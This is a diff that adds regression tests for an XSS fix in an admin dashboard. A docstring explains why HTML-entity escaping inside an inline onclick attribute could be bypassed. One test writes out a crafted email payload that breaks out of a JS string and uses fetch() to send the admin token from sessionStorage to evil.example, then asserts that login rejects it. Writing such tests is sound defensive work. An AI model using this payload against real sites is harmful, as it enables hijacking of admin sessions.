@@ -417,3 +417,33 @@ def test_notify_retry_recovers_a_dropped_email(client: TestClient, fake_store, m
 
     assert client.post("/admin/notify/retry", headers=headers).json()["recovered"] == 1
     assert access.get_record(TEST_EMAIL, cached=False)["notify_state"] == "sent"
+
+
+# ── Dashboard injection ──────────────────────────────────────────────────────
+
+def test_dashboard_never_interpolates_an_email_into_an_inline_handler(
+        client: TestClient):
+    """The escaping that used to guard these rows could not work where it sat.
+
+    esc() maps ' to &#39;, but inside a double-quoted HTML attribute the parser
+    entity-decodes that back to a quote *before* the JS is parsed — so
+    onclick="approve('...')" was breakable by anyone who could get a crafted
+    address stored, which is any unauthenticated visitor via POST /auth/login.
+    Row actions now carry the address as data and are dispatched by a delegated
+    listener, so the value is never parsed as JS.
+    """
+    html = client.get("/admin").text
+    for action in ("approve", "deny", "grant", "del"):
+        assert f'onclick="{action}(' not in html
+        assert f'data-act="{action}"' in html
+
+
+def test_a_crafted_address_cannot_reach_the_dashboard(
+        client: TestClient, fake_store, no_email, admin_headers):
+    """Defence in depth: the payload is rejected at the front door too."""
+    payload = ("a');fetch('https://evil.example/?t='+"
+               "sessionStorage.getItem('tl-admin-token'));//x@attacker.com")
+    assert client.post("/auth/login", json={"email": payload}).status_code == 400
+
+    listed = client.get("/admin/users", headers=admin_headers).json()
+    assert not [u for u in listed["pending"] if "fetch(" in u["email"]]
